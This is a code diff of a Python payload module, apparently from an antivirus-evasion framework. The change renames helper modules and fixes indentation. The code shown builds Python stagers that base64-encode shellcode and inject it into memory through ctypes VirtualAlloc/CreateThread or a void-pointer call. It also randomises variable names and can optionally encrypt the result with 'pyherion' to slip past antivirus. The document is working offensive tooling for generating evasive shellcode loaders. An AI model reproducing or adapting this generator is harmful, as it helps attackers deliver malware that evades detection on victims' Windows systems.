@@ -11,8 +11,8 @@ module by @christruncer
 import base64
 
 from modules.common import shellcode
-from modules.common import randomizer
-from modules.common import crypters
+from modules.common import helpers
+from modules.common import encryption
 
 
 class Payload:
@@ -27,8 +27,8 @@ class Payload:
 
         # options we require user interaction for- format is {Option : [Value, Description]]}
         self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"],
-                        "use_pyherion" : ["N", "Use the pyherion encrypter"],
-                        "inject_method" : ["virtual", "[virtual]alloc or [void]pointer"]}
+                                 "use_pyherion" : ["N", "Use the pyherion encrypter"],
+                                 "inject_method" : ["virtual", "[virtual]alloc or [void]pointer"]}
 
     def generate(self):
         if self.required_options["inject_method"][0].lower() == "virtual":
@@ -39,11 +39,11 @@ class Payload:
             EncodedShellcode = base64.b64encode(Shellcode)    
 
             # Generate Random Variable Names
-            ShellcodeVariableName = randomizer.randomString()
-            RandPtr = randomizer.randomString()
-            RandBuf = randomizer.randomString()
-            RandHt = randomizer.randomString()
-            RandT = randomizer.randomString()
+            ShellcodeVariableName = helpers.randomString()
+            RandPtr = helpers.randomString()
+            RandBuf = helpers.randomString()
+            RandHt = helpers.randomString()
+            RandT = helpers.randomString()
                     
             PayloadCode = 'import ctypes\n'
             PayloadCode +=  'import base64\n'
@@ -56,7 +56,7 @@ class Payload:
             PayloadCode += 'ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))\n'
 
             if self.required_options["use_pyherion"][0].lower() == "y":
-                PayloadCode = crypters.pyherion(PayloadCode)
+                PayloadCode = encryption.pyherion(PayloadCode)
 
             return PayloadCode
 
@@ -66,11 +66,11 @@ class Payload:
             Shellcode = self.shellcode.generate()
 
             # Generate Random Variable Names
-            ShellcodeVariableName = randomizer.randomString()
-            RandShellcode = randomizer.randomString()
-            RandReverseShell = randomizer.randomString()
-            RandMemoryShell = randomizer.randomString()
-            DecodedShellcode = randomizer.randomString()
+            ShellcodeVariableName = helpers.randomString()
+            RandShellcode = helpers.randomString()
+            RandReverseShell = helpers.randomString()
+            RandMemoryShell = helpers.randomString()
+            DecodedShellcode = helpers.randomString()
 
             # Base64 Encode Shellcode
             EncodedShellcode = base64.b64encode(Shellcode)
@@ -84,6 +84,6 @@ class Payload:
             PayloadCode += RandShellcode + '()'
     
             if self.required_options["use_pyherion"][0].lower() == "y":
-                PayloadCode = crypters.pyherion(PayloadCode)
+                PayloadCode = encryption.pyherion(PayloadCode)
 
             return PayloadCode
